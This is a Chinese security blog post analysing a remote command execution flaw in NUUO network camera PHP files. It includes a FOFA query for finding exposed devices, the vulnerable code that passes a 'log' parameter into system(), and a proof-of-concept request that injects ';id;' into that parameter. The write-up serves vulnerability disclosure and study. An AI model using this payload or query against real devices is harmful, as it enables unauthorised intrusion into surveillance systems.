---
title: "NUUO摄像机 handle_site_config.php 远程命令执行漏洞"
source: https://mrxn.net/jswz/nuuo-handle_site_config-rce.html
asset_dir: assets/nuuo摄像机-handle_site_config.php-远程命令执行漏洞
---

# NUUO摄像机 handle\_site\_config.php 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/26 18:22
- 1322浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

摄像机

软件

脚本语言

---

# 漏洞简介

NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUUO摄像头 `handle_site_config.php` 、 `handle_config.php`、`__debugging_center_utils___.php`

存在远程[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可以利用此漏洞在服务器上执行任意命令造成服务器失陷。

便携式摄像机

# 影响版本

# fofa语法

> `body="www.nuuo.com/eHelpdesk.php"`

# 漏洞分析

handle\_site\_config.php 业务逻辑如下

```
<?php
define("LOG_FILE_FOLDER", "/mtd/block4/log");

function print_file($file_fullpath_name)
{
    $cmd = "cat " . $file_fullpath_name;
    echo $file_fullpath_name . "\n\n";
    system($cmd);
}

// Make sure program execution doesn't time out
// Set maximum script execution time in seconds (0 means no limit)
//set_time_limit(0);
?>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Debugging Center</title>
</head>
<body>

<pre>
<?php
    if (isset($_GET['log']) && !empty($_GET['log']))
    {
        $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);
        print_file($file_fullpath_name);
    }
    else
    {
        die("unknown command.");
    }
?>
</pre>

</body>
</html>
```

深入探索

服务器安全服务

云安全解决方案

计算机安全

通过 get 获取 log 参数值 拼接进 `$file_fullpath_name` 再将其代入 `print_file` 函数执行，而 `print_file` 函数里将 `$file_fullpath_name` 拼接进 cat 命令后调用 `system` 函数执行直接执行导致任意命令执行漏洞。

漏洞修复方案

另外两个文件 `handle_config.php`、`__debugging_center_utils___.php`[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)点和此处一样

# 漏洞复现

```
GET /handle_site_config.php?log=;id; HTTP/1.1
Host: nuuo.mrxn.net
```

[![NUUO摄像机 handle_site_config.php 远程命令执行漏洞](images/img-001-bd931c7c8943.webp)](https://image.mrxn.net/c1ba457012cb4af2bc62b25e0a60fede.webp)

成功执行 `id` 命令，并回显执行结果。

计算机服务器

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

网络安全
